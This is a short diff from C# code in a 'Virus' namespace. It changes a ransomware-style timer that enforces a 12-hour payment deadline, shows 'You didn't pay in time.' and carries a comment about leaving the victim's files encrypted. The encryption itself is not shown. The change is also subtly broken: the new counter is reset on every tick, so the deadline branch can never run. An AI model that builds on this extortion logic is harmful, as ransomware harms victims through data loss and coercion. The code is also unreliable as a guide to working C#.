@@ -104,12 +104,14 @@ namespace Virus
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-
-            if (DateTime.Now >= DateTimePlus12Hours)
+            int i = 0;
+            
+            if (DateTime.Now >= DateTimePlus12Hours && i > 3)
             {
                 timer1.Stop();
                 MessageBox.Show("You didn't pay in time.", "Sorry!");
                 //TODO end app and leave files encrypted
+                i++;
 
             }
             if (DateTime.Now <= DateTimePlus12Hours)
